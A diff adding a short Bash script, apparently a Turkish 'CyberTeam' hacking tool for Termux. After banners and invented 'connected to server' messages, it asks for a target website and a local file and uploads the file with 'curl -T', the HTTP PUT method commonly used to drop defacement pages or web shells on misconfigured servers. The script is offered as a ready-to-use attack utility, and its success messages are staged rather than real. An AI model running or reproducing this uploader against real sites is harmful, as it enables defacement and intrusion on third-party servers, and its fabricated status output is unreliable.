@@ -1,0 +1,47 @@
+
+
+#lu recode gua sumpahin melarat#
+
+clear
+sleep 1
+echo "[+] Açılıyor..Lütfen Bekleyiniz" | lolcat
+sleep 2
+clear
+figlet CyberTeam | lolcat
+sleep 2
+clear
+figlet CyberTeam | lolcat
+echo "_______________________________________________________
+
+                 [ CyberTeam Official ]
+
+[+] Coded   : Anıl Şahin               
+[+] Team    : CyberTeam
+[+] Github  : https://github.com/CyberTeamm
+[+] Contact : cyberteamoffical@gmail.com
+[+] Youtube : CyberTeam
+[+] Instagram : @cyberteamofficial
+
+_______________________________________________________" | lolcat
+sleep 1
+echo "[+] Servere Bağlanıyor..." | lolcat
+sleep 1
+echo "[+] Servere Başarıyla Bağlandı!" | lolcat
+sleep 2
+echo
+echo
+echo "[+] Website Adresi : " $target |lolcat
+read target
+echo "[+] Bağlanıyor..." | lolcat
+sleep 2
+echo "[+] Atılacak Dosya Yolu Ve Dosyası : " $sc |lolcat
+read sc
+curl -T $HOME/storage/downloads/$sc $target
+echo "[+] Dosyalar Siteye Atılıyor..." | lolcat
+sleep 2
+echo "[+] Başarıyla Tamamlandı " | lolcat
+sleep 3
+clear
+echo "Tekrar Bekleriz..." | lolcat
+sleep 5
+clear
